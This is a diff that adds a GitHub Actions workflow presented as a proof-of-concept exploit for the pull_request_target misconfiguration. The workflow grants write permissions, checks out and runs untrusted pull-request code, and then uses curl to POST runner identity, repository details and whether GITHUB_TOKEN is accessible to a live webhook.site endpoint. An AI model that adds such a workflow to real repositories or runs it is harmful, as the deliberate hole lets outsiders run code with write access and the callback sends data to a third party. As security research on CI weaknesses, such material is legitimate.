@@ -1,0 +1,75 @@
+name: Vulnerable PR Target PoC
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions:
+  actions: write
+  contents: write
+  pull-requests: write
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR code (DANGEROUS!)
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}  # THIS IS THE VULNERABILITY!
+          
+      - name: Execute arbitrary code from PR
+        run: |
+          echo "This is running code from the PR with elevated permissions!"
+          echo "Current user: $(whoami)"
+          echo "Repository: $GITHUB_REPOSITORY"
+          
+          # Simulate what an attacker could do
+          ls -la
+          
+          # Extract sensitive information
+          echo "GitHub Actor: $GITHUB_ACTOR"
+          echo "Event: $GITHUB_EVENT_NAME"
+          echo "Ref: $GITHUB_REF"
+          
+          # Create a proof file
+          echo "Workflow injection successful at $(date)" > /tmp/exploit_proof.txt
+          echo "Repository: $GITHUB_REPOSITORY" >> /tmp/exploit_proof.txt
+          echo "PR Number: ${{ github.event.pull_request.number }}" >> /tmp/exploit_proof.txt
+          
+      - name: Send exploitation proof to webhook
+        run: |
+          # Capture system information
+          EXPLOIT_DATA=$(cat /tmp/exploit_proof.txt)
+          IDENTITY=$(whoami)
+          REPO_INFO="$GITHUB_REPOSITORY PR#${{ github.event.pull_request.number }}"
+          
+          # Create JSON payload
+          PAYLOAD=$(jq -n \
+            --arg id "$IDENTITY" \
+            --arg repo "$REPO_INFO" \
+            --arg exploit "$EXPLOIT_DATA" \
+            --arg token "GITHUB_TOKEN exists: ${{ secrets.GITHUB_TOKEN != '' }}" \
+            '{
+              "vulnerability": "pull_request_target workflow injection",
+              "compromised_runner_identity": $id,
+              "target_repository": $repo,
+              "exploit_proof": $exploit,
+              "secrets_accessible": $token,
+              "timestamp": (now | todateiso8601),
+              "severity": "HIGH"
+            }')
+          
+          # Send to webhook
+          curl -X POST \
+            -H "Content-Type: application/json" \
+            -H "User-Agent: GitHub-Actions-Exploit-PoC" \
+            -d "$PAYLOAD" \
+            "https://webhook.site/86e8b412-7191-449c-9b7e-071bad00d67e"
+            
+          echo "Exploitation proof sent to webhook!"
+
+      - name: Upload artifact as additional proof
+        uses: actions/upload-artifact@v3
+        with:
+          name: exploit-proof
+          path: /tmp/exploit_proof.txt
